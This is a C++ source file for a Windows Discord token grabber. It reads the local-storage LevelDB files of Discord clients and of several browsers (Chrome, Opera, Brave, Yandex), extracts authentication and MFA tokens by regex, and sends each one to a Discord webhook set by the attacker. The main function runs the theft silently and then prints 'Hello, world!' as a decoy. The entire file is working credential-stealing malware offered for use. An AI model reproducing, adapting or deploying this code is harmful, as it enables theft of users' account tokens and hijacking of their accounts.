/* xms's original token grabber rewritten for less vector abuse
 * and slightly faster and code cleaner
 * this is windows specific
 * paste webhook url without 'discord.com' like from this:
 * 'discord.com/api/johsdfjkdsjsdkjkjsdf'
 * to this
 * '/api/johsdfjkdsjsdkjkjsdf'
 */
#define WEBHOOK_URL "insert here"

#include <iostream>
#include <string>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <filesystem>
#include <regex>
#include <vector>
#include <windows.h>
#include <wininet.h>
#include <string.h>
#pragma comment(lib, "wininet.lib")

std::vector<std::string> Tokens;

void SendToken(const char* Token) {
    char JSONMessage[strlen(Token) + 39];
    const char* RequestAcceptTypes[2] = {"application/json", NULL};
    snprintf(JSONMessage, strlen(Token) + 39, "{\"content\": \"Token grabbed!: `%s`\"}", Token);

    HANDLE WinInternet = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!WinInternet) return;
    HINTERNET WinConnectToNet = InternetConnect(WinInternet, "discord.com", 443, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!WinConnectToNet) return;
    HINTERNET WinRequest = HttpOpenRequest(WinConnectToNet, "POST", WEBHOOK_URL, NULL, NULL, RequestAcceptTypes, INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_UI, 0);
    HttpAddRequestHeaders(WinRequest, "Content-Type: application/json\r\n", -1, HTTP_ADDREQ_FLAG_ADD);
    if (!WinRequest) return;
    if (!HttpSendRequest(WinRequest, NULL, 0, JSONMessage, strlen(JSONMessage))) return;

    InternetCloseHandle(WinRequest);
    InternetCloseHandle(WinConnectToNet);
    InternetCloseHandle(WinInternet);
}

void ExtractTokens(std::string Filename) {
    std::ifstream File(Filename, std::ios::binary);
    if (File.is_open()) {
        std::string Line;
        while (getline(File, Line)) {
            std::regex TokenPattern("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}");
            std::smatch Match;
            std::regex_search(Line, Match, TokenPattern);
            if (Match.length() != 0)
                for (auto Token : Match)
                    Tokens.push_back(Token);
        }
    }
}

void Grab(void) {
    std::string RoamingPath = std::string(getenv("APPDATA")),
                LocalPath   = std::string(getenv("LOCALAPPDATA"));
    std::string Path[7] = {
        RoamingPath + "\\discord\\Local Storage\\leveldb",
        RoamingPath + "\\discordcanary\\Local Storage\\leveldb",
        RoamingPath + "\\discordptb\\Local Storage\\leveldb",
        LocalPath + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
        LocalPath + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
        LocalPath + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
        LocalPath + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"
    };
    for (auto &Entry : Path) {
        std::filesystem::path Directory(Entry);
        if (std::filesystem::exists(Directory)) {
            std::string FileExtensions[4] = {".ldb", ".LDB", ".log", ".LOG"};
            for (auto &File : std::filesystem::directory_iterator(Directory)) {
                for (auto Extension : FileExtensions)
                    if (File.path().extension().string().compare(Extension) == 0)
                        ExtractTokens(File.path().string());
            }
        }
    }
    if (Tokens.empty()) return;

    for (auto Token : Tokens)
        SendToken(Token.c_str());
}

int main() {
    Grab();
    std::cout << "Hello, world!" << std::endl;
    return 0;
}
